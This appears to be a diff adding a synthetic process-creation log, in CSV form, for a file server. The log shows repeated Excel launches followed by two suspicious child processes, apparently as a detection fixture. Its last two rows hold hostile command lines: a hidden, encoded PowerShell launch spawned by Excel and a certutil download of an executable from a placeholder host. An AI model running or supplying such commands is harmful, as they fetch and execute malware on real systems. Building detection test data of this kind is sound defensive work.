@@ -1,0 +1,33 @@
+timestamp,host,user,process,action,pid,parent_process,command_line
+2026-10-07 02:00:00,SRV-FILE01,usr_dana,excel.exe,start,12013,explorer.exe,excel.exe
+2026-10-07 02:01:30,SRV-FILE01,usr_dana,excel.exe,start,12026,explorer.exe,excel.exe
+2026-10-07 02:03:00,SRV-FILE01,usr_dana,excel.exe,start,12039,explorer.exe,excel.exe
+2026-10-07 02:04:30,SRV-FILE01,usr_dana,excel.exe,start,12052,explorer.exe,excel.exe
+2026-10-07 02:06:00,SRV-FILE01,usr_dana,excel.exe,start,12065,explorer.exe,excel.exe
+2026-10-07 02:07:30,SRV-FILE01,usr_dana,excel.exe,start,12078,explorer.exe,excel.exe
+2026-10-07 02:09:00,SRV-FILE01,usr_dana,excel.exe,start,12091,explorer.exe,excel.exe
+2026-10-07 02:10:30,SRV-FILE01,usr_dana,excel.exe,start,12104,explorer.exe,excel.exe
+2026-10-07 02:12:00,SRV-FILE01,usr_dana,excel.exe,start,12117,explorer.exe,excel.exe
+2026-10-07 02:13:30,SRV-FILE01,usr_dana,excel.exe,start,12130,explorer.exe,excel.exe
+2026-10-07 02:15:00,SRV-FILE01,usr_dana,excel.exe,start,12143,explorer.exe,excel.exe
+2026-10-07 02:16:30,SRV-FILE01,usr_dana,excel.exe,start,12156,explorer.exe,excel.exe
+2026-10-07 02:18:00,SRV-FILE01,usr_dana,excel.exe,start,12169,explorer.exe,excel.exe
+2026-10-07 02:19:30,SRV-FILE01,usr_dana,excel.exe,start,12182,explorer.exe,excel.exe
+2026-10-07 02:21:00,SRV-FILE01,usr_dana,excel.exe,start,12195,explorer.exe,excel.exe
+2026-10-07 02:22:30,SRV-FILE01,usr_dana,excel.exe,start,12208,explorer.exe,excel.exe
+2026-10-07 02:24:00,SRV-FILE01,usr_dana,excel.exe,start,12221,explorer.exe,excel.exe
+2026-10-07 02:25:30,SRV-FILE01,usr_dana,excel.exe,start,12234,explorer.exe,excel.exe
+2026-10-07 02:27:00,SRV-FILE01,usr_dana,excel.exe,start,12247,explorer.exe,excel.exe
+2026-10-07 02:28:30,SRV-FILE01,usr_dana,excel.exe,start,12260,explorer.exe,excel.exe
+2026-10-07 02:30:00,SRV-FILE01,usr_dana,excel.exe,start,12273,explorer.exe,excel.exe
+2026-10-07 02:31:30,SRV-FILE01,usr_dana,excel.exe,start,12286,explorer.exe,excel.exe
+2026-10-07 02:33:00,SRV-FILE01,usr_dana,excel.exe,start,12299,explorer.exe,excel.exe
+2026-10-07 02:34:30,SRV-FILE01,usr_dana,excel.exe,start,12312,explorer.exe,excel.exe
+2026-10-07 02:36:00,SRV-FILE01,usr_dana,excel.exe,start,12325,explorer.exe,excel.exe
+2026-10-07 02:37:30,SRV-FILE01,usr_dana,excel.exe,start,12338,explorer.exe,excel.exe
+2026-10-07 02:39:00,SRV-FILE01,usr_dana,excel.exe,start,12351,explorer.exe,excel.exe
+2026-10-07 02:40:30,SRV-FILE01,usr_dana,excel.exe,start,12364,explorer.exe,excel.exe
+2026-10-07 02:42:00,SRV-FILE01,usr_dana,excel.exe,start,12377,explorer.exe,excel.exe
+2026-10-07 02:43:30,SRV-FILE01,usr_dana,excel.exe,start,12390,explorer.exe,excel.exe
+2026-10-07 02:04:00,SRV-FILE01,usr_dana,powershell.exe,start,13101,excel.exe,powershell -nop -w hidden -enc <base64blob>
+2026-10-07 02:30:00,SRV-FILE01,usr_dana,certutil.exe,start,13150,powershell.exe,certutil -urlcache -split -f http://fileshare.example/p.exe
